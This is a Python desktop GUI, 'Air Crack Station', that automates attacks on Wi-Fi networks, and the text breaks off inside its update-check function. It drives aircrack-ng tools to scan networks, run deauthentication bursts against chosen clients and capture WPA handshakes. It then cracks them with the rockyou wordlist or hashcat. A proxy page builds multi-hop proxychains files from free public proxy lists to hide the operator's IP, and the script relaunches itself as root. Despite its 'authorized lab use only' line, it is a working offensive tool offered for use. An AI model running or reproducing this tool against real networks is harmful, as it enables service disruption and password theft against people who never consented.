#!/usr/bin/env python3
"""ACS desktop app. Made by Pakun & iinze0. Authorized lab use only."""

from __future__ import annotations

import json
import os
import queue
import re
import shutil
import subprocess
import sys
import threading
import urllib.request
from pathlib import Path

try:
    import tkinter as tk
    from tkinter import messagebox, ttk
except ImportError:
    sys.stderr.write(
        "ACS needs the Tk toolkit.\n"
        "  sudo apt-get update && sudo apt-get install -y python3-tk\n"
    )
    raise SystemExit(1)

HOME = Path.home() / ".acs"
SESSION = HOME / "app-session.json"
CONF = HOME / "proxychains.conf"
APP_VER = "1.3.0"
APP_RAW = "https://raw.githubusercontent.com/iinze0/ACS-app/main/acs_app.py"
APP_VERSION_URL = "https://raw.githubusercontent.com/iinze0/ACS-app/main/VERSION"

BG = "#0b0e0c"
SURFACE = "#121815"
CARD = "#171e1a"
RAISED = "#1c2620"
FG = "#e7f6ee"
MUTED = "#8aa394"
ACCENT = "#3dff8a"
WARN = "#e8c547"
DANGER = "#ff8d8d"
LINE = "#24332b"
UI = "DejaVu Sans"
MONO = "DejaVu Sans Mono"

SOURCES = {
    "socks5": [
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    ],
    "socks4": [
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
    ],
    "http": [
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    ],
}

IP_RE = re.compile(r"^(\d{1,3}(?:\.\d{1,3}){3}):(\d{2,5})$")
MAC_RE = re.compile(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")


def have(cmd: str) -> bool:
    return shutil.which(cmd) is not None


def default_session() -> dict:
    return {
        "iface": "wlan0",
        "mon": "",
        "channel": "6",
        "bssid": "",
        "essid": "",
        "client": "",
        "cap": str(HOME / "handshake"),
        "wordlist": "/usr/share/wordlists/rockyou.txt",
    }


def load_session() -> dict:
    data = default_session()
    try:
        saved = json.loads(SESSION.read_text())
        if isinstance(saved, dict):
            data.update({k: str(v) for k, v in saved.items() if k in data})
    except (OSError, json.JSONDecodeError):
        pass
    return data


def save_session(data: dict) -> None:
    HOME.mkdir(parents=True, exist_ok=True)
    SESSION.write_text(json.dumps(data, indent=2))


def relaunch_as_root() -> None:
    if os.geteuid() == 0:
        return
    script = str(Path(__file__).resolve())
    if have("pkexec"):
        os.execvp("pkexec", ["pkexec", sys.executable, script, *sys.argv[1:]])
    if have("sudo"):
        os.execvp("sudo", ["sudo", "-E", sys.executable, script, *sys.argv[1:]])
    sys.stderr.write("Run ACS as root: sudo python3 acs_app.py\n")
    raise SystemExit(1)


class App(tk.Tk):
    def __init__(self) -> None:
        super().__init__()
        self.title(f"ACS {APP_VER}")
        self.geometry("1180x800")
        self.minsize(980, 640)
        self.configure(bg=BG)
        self.session = load_session()
        self.vars = {k: tk.StringVar(value=v) for k, v in self.session.items()}
        self.log_q: queue.Queue[str] = queue.Queue()
        self.proc: subprocess.Popen[str] | None = None
        self.proxies: list[str] = []
        self.kind = tk.StringVar(value="socks5")
        self.hops = tk.StringVar(value="8")
        self.scan_for = tk.StringVar(value="15")
        self.target_line = tk.StringVar(value="No target locked")
        self.page = tk.StringVar(value="Station")
        self.clients: list[tuple[str, str, str, str]] = []
        self.nav_btns: dict[str, tk.Button] = {}
        self._build()
        for var in self.vars.values():
            var.trace_add("write", self._refresh_status)
        self._refresh_status()
        self.after(120, self._drain)
        self.protocol("WM_DELETE_WINDOW", self._close)

    def _build(self) -> None:
        top = tk.Frame(self, bg=SURFACE)
        top.pack(fill="x")
        brand = tk.Frame(top, bg=SURFACE)
        brand.pack(side="left", padx=22, pady=16)
        tk.Label(brand, text="ACS", bg=SURFACE, fg=ACCENT, font=(UI, 22, "bold")).pack(anchor="w")
        tk.Label(
            brand,
            text="Air Crack Station  ·  Pakun & iinze0",
            bg=SURFACE,
            fg=MUTED,
            font=(UI, 10),
        ).pack(anchor="w")

        chips = tk.Frame(top, bg=SURFACE)
        chips.pack(side="right", padx=22)
        self.chip_iface = self._chip(chips, "wlan0")
        self.chip_mon = self._chip(chips, "managed")
        self.chip_target = self._chip(chips, "no target")
        self.status = tk.Label(top, text=f"v{APP_VER}", bg=SURFACE, fg=MUTED, font=(UI, 10))
        self.status.pack(side="right", padx=(0, 8))

        tk.Frame(self, bg=LINE, height=1).pack(fill="x")

        body = tk.Frame(self, bg=BG)
        body.pack(fill="both", expand=True)

        nav = tk.Frame(body, bg=SURFACE, width=196)
        nav.pack(side="left", fill="y")
        nav.pack_propagate(False)
        tk.Label(nav, text="WORKSPACE", bg=SURFACE, fg=MUTED, font=(UI, 8), anchor="w").pack(
            fill="x", padx=18, pady=(18, 6)
        )
        for name in ("Station", "Scan", "Attack", "Crack", "Proxy"):
            btn = tk.Button(
                nav,
                text=f"  {name}",
                command=lambda n=name: self.show(n),
                bg=SURFACE,
                fg=FG,
                activebackground=ACCENT,
                activeforeground=BG,
                relief="flat",
                anchor="w",
                font=(UI, 12),
                pady=11,
                cursor="hand2",
                bd=0,
            )
            btn.pack(fill="x", padx=10, pady=1)
            self.nav_btns[name] = btn

        self.stage = tk.Frame(body, bg=BG)
        self.stage.pack(side="left", fill="both", expand=True, padx=22, pady=18)
        self.pages = {
            "Station": self._page_station(),
            "Scan": self._page_scan(),
            "Attack": self._page_attack(),
            "Crack": self._page_crack(),
            "Proxy": self._page_proxy(),
        }
        self.show("Station")

        log_wrap = tk.Frame(self, bg=CARD, highlightbackground=LINE, highlightthickness=1)
        log_wrap.pack(fill="both", padx=16, pady=(0, 14))
        log_bar = tk.Frame(log_wrap, bg=CARD)
        log_bar.pack(fill="x")
        tk.Label(log_bar, text="OUTPUT", bg=CARD, fg=MUTED, font=(UI, 8)).pack(side="left", padx=12, pady=8)
        tk.Button(
            log_bar,
            text="Clear",
            command=self._clear_log,
            bg=CARD,
            fg=MUTED,
            activebackground=RAISED,
            activeforeground=FG,
            relief="flat",
            font=(UI, 9),
            cursor="hand2",
            bd=0,
        ).pack(side="right", padx=8)
        self.log = tk.Text(
            log_wrap,
            height=7,
            bg="#090c0a",
            fg=FG,
            insertbackground=FG,
            relief="flat",
            font=(MONO, 10),
            wrap="word",
            padx=12,
            pady=8,
            bd=0,
        )
        self.log.pack(fill="both", expand=True)
        self.log.tag_configure("cmd", foreground=MUTED)
        self.log.tag_configure("bad", foreground=DANGER)
        self.log.tag_configure("ok", foreground=ACCENT)

    def _chip(self, parent: tk.Widget, text: str) -> tk.Label:
        lbl = tk.Label(
            parent,
            text=text,
            bg=RAISED,
            fg=FG,
            font=(UI, 10),
            padx=10,
            pady=4,
        )
        lbl.pack(side="left", padx=4)
        return lbl

    def _refresh_status(self, *_args: object) -> None:
        vals = self._vals()
        self.chip_iface.config(text=vals["iface"] or "no iface")
        if vals["mon"]:
            self.chip_mon.config(text=vals["mon"], fg=ACCENT)
        else:
            self.chip_mon.config(text="managed", fg=MUTED)
        name = vals["essid"] or vals["bssid"] or "no target"
        self.chip_target.config(text=name, fg=ACCENT if vals["bssid"] else MUTED)
        chan = vals["channel"] or "—"
        self.target_line.set(f"{name}    channel {chan}    {vals['bssid'] or 'no BSSID'}")

    def _set_busy(self, busy: bool) -> None:
        self.status.config(text="working…" if busy else f"v{APP_VER}", fg=WARN if busy else MUTED)

    def show(self, name: str) -> None:
        for child in self.stage.winfo_children():
            child.pack_forget()
        self.pages[name].pack(fill="both", expand=True)
        self.page.set(name)
        for key, btn in self.nav_btns.items():
            if key == name:
                btn.config(bg=ACCENT, fg=BG)
            else:
                btn.config(bg=SURFACE, fg=FG)

    def _heading(self, parent: tk.Widget, title: str, subtitle: str) -> None:
        tk.Label(parent, text=title, bg=BG, fg=FG, font=(UI, 26, "bold")).pack(anchor="w")
        tk.Label(parent, text=subtitle, bg=BG, fg=MUTED, font=(UI, 11)).pack(anchor="w", pady=(2, 14))

    def _card(self, parent: tk.Widget) -> tk.Frame:
        outer = tk.Frame(parent, bg=CARD, highlightbackground=LINE, highlightthickness=1)
        inner = tk.Frame(outer, bg=CARD)
        inner.pack(fill="both", expand=True, padx=16, pady=14)
        outer.inner = inner  # type: ignore[attr-defined]
        return outer

    def _label(self, parent: tk.Widget, text: str) -> None:
        tk.Label(parent, text=text.upper(), bg=CARD, fg=MUTED, font=(UI, 8)).pack(anchor="w", pady=(8, 2))

    def _entry(self, parent: tk.Widget, key: str, caption: str) -> None:
        self._label(parent, caption)
        tk.Entry(
            parent,
            textvariable=self.vars[key],
            bg=BG,
            fg=FG,
            insertbackground=ACCENT,
            relief="flat",
            highlightthickness=1,
            highlightbackground=LINE,
            highlightcolor=ACCENT,
            font=(MONO, 11),
        ).pack(fill="x", ipady=7)

    def _btn(self, parent: tk.Widget, text: str, fn: object, kind: str = "primary") -> tk.Button:
        styles = {
            "primary": (ACCENT, BG, "#b8ffd8"),
            "ghost": (RAISED, FG, "#2a3830"),
            "danger": ("#3a1818", DANGER, "#542222"),
        }
        bg, fg, active = styles[kind]
        btn = tk.Button(
            parent,
            text=text,
            command=fn,
            bg=bg,
            fg=fg,
            activebackground=active,
            activeforeground=BG if kind == "primary" else FG,
            relief="flat",
            font=(UI, 11, "bold"),
            padx=14,
            pady=9,
            cursor="hand2",
            bd=0,
        )
        btn.pack(side="left", padx=(0, 8))
        return btn

    def _page_station(self) -> tk.Frame:
        page = tk.Frame(self.stage, bg=BG)
        self._heading(page, "Station", "Set the wireless card and the network you are working on.")
        grid = tk.Frame(page, bg=BG)
        grid.pack(fill="both", expand=True)
        left_card = self._card(grid)
        right_card = self._card(grid)
        left_card.pack(side="left", fill="both", expand=True, padx=(0, 8))
        right_card.pack(side="left", fill="both", expand=True, padx=(8, 0))
        left, right = left_card.inner, right_card.inner  # type: ignore[attr-defined]
        tk.Label(left, text="Radio", bg=CARD, fg=FG, font=(UI, 13, "bold")).pack(anchor="w")
        tk.Label(right, text="Target", bg=CARD, fg=FG, font=(UI, 13, "bold")).pack(anchor="w")
        for key, caption in (("iface", "Interface"), ("mon", "Monitor"), ("channel", "Channel")):
            self._entry(left, key, caption)
        for key, caption in (
            ("bssid", "BSSID"),
            ("essid", "Network name"),
            ("client", "Client"),
            ("wordlist", "Wordlist"),
        ):
            self._entry(right, key, caption)
        row = tk.Frame(page, bg=BG)
        row.pack(fill="x", pady=(14, 0))
        self._btn(row, "Save", self._save)
        self._btn(row, "Detect wireless", self._detect, "ghost")
        self._btn(row, "Monitor mode", self._monitor, "ghost")
        self._btn(row, "Restore Wi-Fi", self._restore, "ghost")
        self._btn(row, "Install tools", self._install, "ghost")
        self._btn(row, "Check for updates", self._check_update, "ghost")
        return page

    def _page_scan(self) -> tk.Frame:
        page = tk.Frame(self.stage, bg=BG)
        self._heading(page, "Networks", "Scan, then click an access point. Click a client to lock that station.")
        bar = tk.Frame(page, bg=BG)
        bar.pack(fill="x", pady=(0, 10))
        tk.Label(bar, text="DURATION", bg=BG, fg=MUTED, font=(UI, 8)).pack(side="left", padx=(0, 8))
        for seconds in ("8", "15", "30"):
            tk.Radiobutton(
                bar,
                text=f"{seconds}s",
                variable=self.scan_for,
                value=seconds,
                bg=BG,
                fg=FG,
                selectcolor=CARD,
                activebackground=BG,
                activeforeground=ACCENT,
                font=(UI, 11),
                highlightthickness=0,
            ).pack(side="left", padx=(0, 6))
        self._btn(bar, "Scan", self._scan)
        self._btn(bar, "Stop", self._stop, "ghost")
        self.ap_count = tk.Label(bar, text="0 networks", bg=BG, fg=MUTED, font=(UI, 10))
        self.ap_count.pack(side="right")

        cols = ("bssid", "ch", "pwr", "enc", "essid")
        self.tree = ttk.Treeview(page, columns=cols, show="headings", height=9)
        for col, title, width in (
            ("bssid", "BSSID", 180),
            ("ch", "CH", 50),
            ("pwr", "SIGNAL", 70),
            ("enc", "ENCRYPTION", 140),
            ("essid", "NETWORK", 260),
        ):
            self.tree.heading(col, text=title)
            self.tree.column(col, width=width, anchor="w")
        self.tree.pack(fill="both", expand=True)
        self.tree.bind("<<TreeviewSelect>>", self._pick_ap)
        style = ttk.Style(self)
        style.theme_use("clam")
        style.configure(
            "Treeview",
            background=CARD,
            fieldbackground=CARD,
            foreground=FG,
            borderwidth=0,
            rowheight=30,
            font=(MONO, 10),
        )
        style.configure("Treeview.Heading", background=RAISED, foreground=ACCENT, relief="flat", font=(UI, 9))
        style.map("Treeview", background=[("selected", "#163328")], foreground=[("selected", ACCENT)])
        style.layout("Treeview", [("Treeview.treearea", {"sticky": "nswe"})])

        tk.Label(page, text="CLIENTS ON THE SELECTED NETWORK", bg=BG, fg=MUTED, font=(UI, 8)).pack(
            anchor="w", pady=(12, 4)
        )
        self.client_tree = ttk.Treeview(page, columns=("mac", "pwr", "probes"), show="headings", height=4)
        for col, title, width in (("mac", "CLIENT", 220), ("pwr", "SIGNAL", 80), ("probes", "PROBES", 360)):
            self.client_tree.heading(col, text=title)
            self.client_tree.column(col, width=width, anchor="w")
        self.client_tree.pack(fill="x")
        self.client_tree.bind("<<TreeviewSelect>>", self._pick_client)
        return page

    def _page_attack(self) -> tk.Frame:
        page = tk.Frame(self.stage, bg=BG)
        self._heading(page, "Attack", "Runs against the locked network. Monitor mode has to be on.")
        tk.Label(page, textvariable=self.target_line, bg=BG, fg=ACCENT, font=(MONO, 11)).pack(anchor="w", pady=(0, 12))
        self._action(
            page,
            "Deauth",
            "Send a short deauth burst. Uses the client field when it is a real MAC.",
            "Send deauth",
            self._deauth,
            "danger",
        )
        self._action(
            page,
            "Fake auth",
            "Associate to the locked access point with the network name you set.",
            "Fake auth",
            self._fakeauth,
            "ghost",
        )
        self._action(
            page,
            "Handshake",
            "Capture on the locked channel, deauth, then crack with the wordlist if it exists.",
            "Capture handshake",
            self._handshake,
            "primary",
        )
        row = tk.Frame(page, bg=BG)
        row.pack(fill="x", pady=(8, 0))
        self._btn(row, "Stop", self._stop, "ghost")
        return page

    def _page_crack(self) -> tk.Frame:
        page = tk.Frame(self.stage, bg=BG)
        self._heading(page, "Crack", "WPA uses the newest capture. Hashcat uses a pcapng from hcxdumptool.")
        tk.Label(page, textvariable=self.target_line, bg=BG, fg=ACCENT, font=(MONO, 11)).pack(anchor="w", pady=(0, 12))
        self._action(page, "WPA wordlist", "aircrack-ng against the latest .cap and your wordlist.", "Crack WPA", self._crack_wpa, "primary")
        self._action(page, "Modern capture", "hcxdumptool writes ~/.acs/hcx.pcapng for about 25 seconds.", "Start hcx capture", self._hcx, "ghost")
        self._action(page, "Hashcat 22000", "Convert that pcapng and run hashcat mode 22000.", "Run hashcat", self._hashcat, "ghost")
        row = tk.Frame(page, bg=BG)
        row.pack(fill="x", pady=(8, 0))
        self._btn(row, "Stop", self._stop, "ghost")
        return page

    def _action(self, parent: tk.Widget, title: str, body: str, button: str, fn: object, kind: str) -> None:
        card = self._card(parent)
        card.pack(fill="x", pady=(0, 8))
        inner = card.inner  # type: ignore[attr-defined]
        tk.Label(inner, text=title, bg=CARD, fg=FG, font=(UI, 13, "bold")).pack(anchor="w")
        tk.Label(inner, text=body, bg=CARD, fg=MUTED, font=(UI, 10), wraplength=640, justify="left").pack(anchor="w", pady=(2, 8))
        row = tk.Frame(inner, bg=CARD)
        row.pack(anchor="w")
        self._btn(row, button, fn, kind)

    def _page_proxy(self) -> tk.Frame:
        page = tk.Frame(self.stage, bg=BG)
        self._heading(page, "Proxy chain", "Pull live addresses from GitHub and write a proxychains file.")
        bar = tk.Frame(page, bg=BG)
        bar.pack(fill="x", pady=(0, 10))
        for kind in ("socks5", "socks4", "http"):
            tk.Radiobutton(
                bar,
                text=kind,
                variable=self.kind,
                value=kind,
                bg=BG,
                fg=FG,
                selectcolor=CARD,
                activebackground=BG,
                activeforeground=ACCENT,
                font=(UI, 11),
                highlightthickness=0,
            ).pack(side="left", padx=(0, 10))
        tk.Label(bar, text="HOPS", bg=BG, fg=MUTED, font=(UI, 8)).pack(side="left", padx=(8, 6))
        tk.Entry(
            bar,
            textvariable=self.hops,
            width=4,
            bg=CARD,
            fg=FG,
            insertbackground=ACCENT,
            relief="flat",
            font=(MONO, 11),
            highlightthickness=1,
            highlightbackground=LINE,
        ).pack(side="left", ipady=4)
        self.proxy_list = tk.Listbox(
            page,
            bg=CARD,
            fg=FG,
            selectbackground="#163328",
            selectforeground=ACCENT,
            relief="flat",
            highlightthickness=1,
            highlightbackground=LINE,
            font=(MONO, 11),
            activestyle="none",
            bd=0,
        )
        self.proxy_list.pack(fill="both", expand=True, pady=(0, 10))
        row = tk.Frame(page, bg=BG)
        row.pack(fill="x")
        self._btn(row, "Pull from GitHub", self._pull_proxies)
        self._btn(row, "Save chain", self._save_chain, "ghost")
        self._btn(row, "Test chain", self._test_chain, "ghost")
        return page

    def _clear_log(self) -> None:
        self.log.delete("1.0", "end")

    def _vals(self) -> dict[str, str]:
        return {k: v.get().strip() for k, v in self.vars.items()}

    def _save(self) -> None:
        data = self._vals()
        save_session(data)
        self._write("saved session")

    def _need(self, cmd: str) -> bool:
        if have(cmd):
            return True
        self._write(f"missing {cmd} — use Install tools")
        return False

    def _need_mon(self) -> str | None:
        mon = self._vals()["mon"]
        if mon and Path(f"/sys/class/net/{mon}").exists():
            return mon
        self._write("no monitor interface — turn monitor mode on first")
        return None

    def _need_bssid(self) -> str | None:
        bssid = self._vals()["bssid"]
        if MAC_RE.match(bssid):
            return bssid
        self._write("set a real BSSID (scan and click an AP)")
        return None

    def _write(self, text: str) -> None:
        self.log_q.put(text.rstrip() + "\n")

    def _drain(self) -> None:
        try:
            while True:
                line = self.log_q.get_nowait()
                tag = "ok"
                low = line.lower()
                if line.startswith("$"):
                    tag = "cmd"
                elif any(word in low for word in ("missing", "fail", "error", "not found", "timed out")):
                    tag = "bad"
                self.log.insert("end", line, tag)
                self.log.see("end")
        except queue.Empty:
            pass
        self.after(120, self._drain)

    def _run(self, args: list[str], timeout: int | None = None) -> None:
        if self.proc and self.proc.poll() is None:
            self._write("something is already running — press Stop")
            return

        def work() -> None:
            self.after(0, lambda: self._set_busy(True))
            self._write("$ " + " ".join(args))
            try:
                self.proc = subprocess.Popen(
                    args,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                )
                assert self.proc.stdout is not None
                if timeout:
                    try:
                        out, _ = self.proc.communicate(timeout=timeout)
                    except subprocess.TimeoutExpired:
                        self.proc.kill()
                        out, _ = self.proc.communicate()
                        self._write(f"(stopped after {timeout}s)")
                    if out:
                        self._write(out)
                else:
                    for line in self.proc.stdout:
                        self._write(line)
                    self.proc.wait()
                code = self.proc.returncode
                self._write(f"(exit {code})")
            except FileNotFoundError:
                self._write(f"not found: {args[0]}")
            except Exception as exc:  # noqa: BLE001
                self._write(str(exc))
            finally:
                self.after(0, lambda: self._set_busy(False))

        threading.Thread(target=work, daemon=True).start()

    def _stop(self) -> None:
        if self.proc and self.proc.poll() is None:
            self.proc.terminate()
            self._write("stopped")
        else:
            self._write("nothing running")

    def _detect(self) -> None:
        if not self._need("iw"):
            return
        try:
            out = subprocess.check_output(["iw", "dev"], text=True, stderr=subprocess.DEVNULL)
        except subprocess.CalledProcessError:
            self._write("iw dev failed")
            return
        names = re.findall(r"Interface\s+(\S+)", out)
        if not names:
            self._write("no wireless interface")
            return
        self.vars["iface"].set(names[0])
        mon = next((n for n in names if n.endswith("mon")), "")
        if mon:
            self.vars["mon"].set(mon)
        self._write("found " + ", ".join(names))
        self._save()

    def _monitor(self) -> None:
        if not self._need("airmon-ng"):
            return
        iface = self._vals()["iface"]
        if not iface:
            self._write("set an interface")
            return
        if not messagebox.askyesno("ACS", f"Enable monitor mode on {iface}? This drops your Wi-Fi."):
            return
        if not self._need("airmon-ng"):
            return

        def work() -> None:
            self._run_sync(["airmon-ng", "check", "kill"])
            self._run_sync(["airmon-ng", "start", iface])
            mon = f"{iface}mon" if Path(f"/sys/class/net/{iface}mon").exists() else ""
            if not mon:
                try:
                    out = subprocess.check_output(["iw", "dev"], text=True)
                    mons = [n for n in re.findall(r"Interface\s+(\S+)", out) if n.endswith("mon")]
                    mon = mons[0] if mons else ""
                except subprocess.CalledProcessError:
                    mon = ""
            if mon:
                self.vars["mon"].set(mon)
                self._write(f"monitor up: {mon}")
                self._save()
            else:
                self._write("monitor interface did not come up")

        threading.Thread(target=work, daemon=True).start()

    def _run_sync(self, args: list[str]) -> None:
        self._write("$ " + " ".join(args))
        try:
            proc = subprocess.run(args, text=True, capture_output=True, timeout=40)
        except subprocess.TimeoutExpired:
            self._write("timed out")
            return
        except FileNotFoundError:
            self._write(f"not found: {args[0]}")
            return
        text = (proc.stdout or "") + (proc.stderr or "")
        if text.strip():
            self._write(text.strip())

    def _restore(self) -> None:
        mon = self._vals()["mon"] or (self._vals()["iface"] + "mon")
        self._run(["airmon-ng", "stop", mon])
        subprocess.Popen(["systemctl", "start", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.vars["mon"].set("")
        self._save()

    def _install(self) -> None:
        if not messagebox.askyesno("ACS", "Install aircrack-ng, hashcat, hcx tools, and proxychains4?"):
            return
        pkgs = [
            "aircrack-ng",
            "hashcat",
            "hcxdumptool",
            "hcxtools",
            "proxychains4",
            "curl",
            "iw",
            "wireless-tools",
        ]
        self._run(["apt-get", "install", "-y", *pkgs])

    def _scan(self) -> None:
        mon = self._need_mon()
        if not mon or not self._need("airodump-ng"):
            return
        HOME.mkdir(parents=True, exist_ok=True)
        prefix = str(HOME / "scan")
        for old in HOME.glob("scan-*.csv"):
            old.unlink(missing_ok=True)

        def work() -> None:
            try:
                seconds = max(5, min(60, int(self.scan_for.get())))
            except ValueError:
                seconds = 15
            self.after(0, lambda: self._set_busy(True))
            self._write(f"scanning {mon} for {seconds}s")
            cmd = ["airodump-ng", "--band", "abg", "--output-format", "csv", "-w", prefix, mon]
            if have("timeout"):
                cmd = ["timeout", str(seconds), *cmd]
            try:
                subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=seconds + 8)
            except subprocess.TimeoutExpired:
                pass
            csvs = sorted(HOME.glob("scan-*.csv"), key=lambda p: p.stat().st_mtime, reverse=True)
            rows = parse_airodump(csvs[0]) if csvs else []
            clients = parse_clients(csvs[0]) if csvs else []
            self.after(0, lambda: self._fill_aps(rows, clients))
            self.after(0, lambda: self._set_busy(False))

        threading.Thread(target=work, daemon=True).start()

    def _fill_aps(
        self,
        rows: list[tuple[str, str, str, str, str]],
        clients: list[tuple[str, str, str, str]] | None = None,
    ) -> None:
        def strength(row: tuple[str, str, str, str, str]) -> int:
            try:
                return int(row[2])
            except ValueError:
                return -999

        rows = sorted(rows, key=strength, reverse=True)
        self.clients = clients or []
        self.tree.delete(*self.tree.get_children())
        self.client_tree.delete(*self.client_tree.get_children())
        for row in rows:
            self.tree.insert("", "end", values=row)
        self.ap_count.config(text=f"{len(rows)} networks")
        self._write(f"{len(rows)} access points, {len(self.clients)} clients")

    def _pick_ap(self, _event: object) -> None:
        sel = self.tree.selection()
        if not sel:
            return
        bssid, ch, _pwr, _enc, essid = self.tree.item(sel[0], "values")
        self.vars["bssid"].set(bssid)
        self.vars["channel"].set(str(ch).strip())
        self.vars["essid"].set(essid)
        self.client_tree.delete(*self.client_tree.get_children())
        matched = [c for c in self.clients if c[2].lower() == bssid.lower()]
        for mac, power, _bssid, probes in matched:
            self.client_tree.insert("", "end", values=(mac, power, probes))
        if len(matched) == 1:
            self.vars["client"].set(matched[0][0])
        self._save()
        self._write(f"locked {essid or bssid} ch {ch}")

    def _pick_client(self, _event: object) -> None:
        sel = self.client_tree.selection()
        if not sel:
            return
        mac = self.client_tree.item(sel[0], "values")[0]
        self.vars["client"].set(mac)
        self._save()
        self._write(f"client {mac}")

    def _deauth(self) -> None:
        mon = self._need_mon()
        bssid = self._need_bssid()
        if not mon or not bssid or not self._need("aireplay-ng"):
            return
        client = self._vals()["client"]
        cmd = ["aireplay-ng", "--deauth", "8", "-a", bssid]
        if MAC_RE.match(client):
            cmd += ["-c", client]
        cmd.append(mon)
        self._run(cmd, timeout=25)

    def _fakeauth(self) -> None:
        mon = self._need_mon()
        bssid = self._need_bssid()
        if not mon or not bssid or not self._need("aireplay-ng"):
            return
        essid = self._vals()["essid"] or "lab"
        self._run(["aireplay-ng", "--fakeauth", "0", "-a", bssid, "-e", essid, mon], timeout=20)

    def _handshake(self) -> None:
        mon = self._need_mon()
        bssid = self._need_bssid()
        if not mon or not bssid or not self._need("airodump-ng") or not self._need("aireplay-ng"):
            return
        vals = self._vals()
        cap = vals["cap"] or str(HOME / "handshake")
        chan = vals["channel"] or "6"

        def work() -> None:
            self._write("capturing handshake for 20s")
            dump = [
                "airodump-ng",
                "-c",
                chan,
                "--bssid",
                bssid,
                "-w",
                cap,
                mon,
            ]
            proc = subprocess.Popen(dump, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.proc = proc
            client = vals["client"]
            deauth = ["aireplay-ng", "--deauth", "6", "-a", bssid]
            if MAC_RE.match(client):
                deauth += ["-c", client]
            deauth.append(mon)
            subprocess.run(deauth, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=20)
            try:
                proc.wait(timeout=12)
            except subprocess.TimeoutExpired:
                proc.terminate()
            caps = sorted(Path(cap).parent.glob(Path(cap).name + "-*.cap"), key=lambda p: p.stat().st_mtime, reverse=True)
            if not caps:
                self._write("no capture written")
                return
            word = vals["wordlist"]
            if Path(word).is_file() and have("aircrack-ng"):
                self._write(f"cracking {caps[0].name}")
                self._run_sync(["aircrack-ng", "-w", word, "-b", bssid, str(caps[0])])
            else:
                self._write(f"saved {caps[0]}")

        threading.Thread(target=work, daemon=True).start()

    def _latest_cap(self) -> Path | None:
        cap = self._vals()["cap"] or str(HOME / "handshake")
        parent = Path(cap).parent
        name = Path(cap).name
        found = sorted(parent.glob(name + "-*.cap"), key=lambda p: p.stat().st_mtime, reverse=True)
        if found:
            return found[0]
        direct = Path(cap if cap.endswith(".cap") else cap + ".cap")
        return direct if direct.is_file() else None

    def _crack_wpa(self) -> None:
        if not self._need("aircrack-ng"):
            return
        cap = self._latest_cap()
        word = self._vals()["wordlist"]
        if cap is None:
            self._write("no capture yet")
            return
        if not Path(word).is_file():
            self._write(f"wordlist missing: {word}")
            return
        cmd = ["aircrack-ng", "-w", word]
        bssid = self._vals()["bssid"]
        if MAC_RE.match(bssid):
            cmd += ["-b", bssid]
        cmd.append(str(cap))
        self._run(cmd)

    def _hcx(self) -> None:
        mon = self._need_mon()
        if not mon or not self._need("hcxdumptool"):
            return
        out = HOME / "hcx.pcapng"
        self._run(["hcxdumptool", "-i", mon, "-w", str(out), "--rds=1"], timeout=25)

    def _hashcat(self) -> None:
        if not self._need("hcxpcapngtool") or not self._need("hashcat"):
            return
        pcap = HOME / "hcx.pcapng"
        if not pcap.is_file():
            self._write("no hcx.pcapng — run hcx capture first")
            return
        word = self._vals()["wordlist"]
        if not Path(word).is_file():
            self._write(f"wordlist missing: {word}")
            return
        digest = HOME / "hash.hc22000"

        def work() -> None:
            self._run_sync(["hcxpcapngtool", "-o", str(digest), str(pcap)])
            if digest.is_file() and digest.stat().st_size:
                self._run_sync(["hashcat", "-m", "22000", str(digest), word, "--force"])
            else:
                self._write("no hashes in that capture")

        threading.Thread(target=work, daemon=True).start()

    def _pull_proxies(self) -> None:
        kind = self.kind.get()
        try:
            count = max(1, min(40, int(self.hops.get())))
        except ValueError:
            count = 8

        def work() -> None:
            found: set[str] = set()
            for url in SOURCES[kind]:
                self._write("GET " + url)
                try:
                    req = urllib.request.Request(url, headers={"User-Agent": "acs-app"})
                    with urllib.request.urlopen(req, timeout=25) as resp:
                        text = resp.read().decode("utf-8", "replace")
                except Exception as exc:  # noqa: BLE001
                    self._write(f"failed {url} ({exc})")
                    continue
                for line in text.splitlines():
                    if IP_RE.match(line.strip()):
                        found.add(line.strip())
            picks = list(found)
            picks.sort()
            # spread the sample instead of always taking the first block
            step = max(1, len(picks) // max(count, 1))
            chosen = picks[::step][:count]
            self.proxies = chosen

            def paint() -> None:
                self.proxy_list.delete(0, "end")
                for item in chosen:
                    self.proxy_list.insert("end", item)
                self._write(f"{len(found)} unique from GitHub, chain uses {len(chosen)}")

            self.after(0, paint)

        threading.Thread(target=work, daemon=True).start()

    def _save_chain(self) -> None:
        if not self.proxies:
            self._write("pull proxies first")
            return
        kind = self.kind.get()
        lines = [
            "# ACS proxy chain — IPs pulled from GitHub",
            "dynamic_chain",
            "proxy_dns",
            "tcp_read_time_out 15000",
            "tcp_connect_time_out 8000",
            "[ProxyList]",
        ]
        for item in self.proxies:
            ip, port = item.split(":", 1)
            lines.append(f"{kind} {ip} {port}")
        HOME.mkdir(parents=True, exist_ok=True)
        CONF.write_text("\n".join(lines) + "\n")
        self._write(f"wrote {CONF}")

    def _test_chain(self) -> None:
        if not CONF.is_file():
            self._write("save a chain first")
            return
        binary = "proxychains4" if have("proxychains4") else "proxychains"
        if not have(binary):
            self._write("proxychains4 is not installed")
            return
        self._run([binary, "-f", str(CONF), "curl", "-fsSL", "--max-time", "25", "https://ifconfig.me"])

    def _check_update(self) -> None:
        def work() -> None:
            text = fetch_remote_app()
            remote = remote_app_version(text or "")
            if not remote:
                self.after(0, lambda: messagebox.showwarning("ACS", "Could not reach GitHub."))
                return
            if version_tuple(remote) <= version_tuple(APP_VER):
                self.after(0, lambda: messagebox.showinfo("ACS", f"Already on {APP_VER}."))
                return
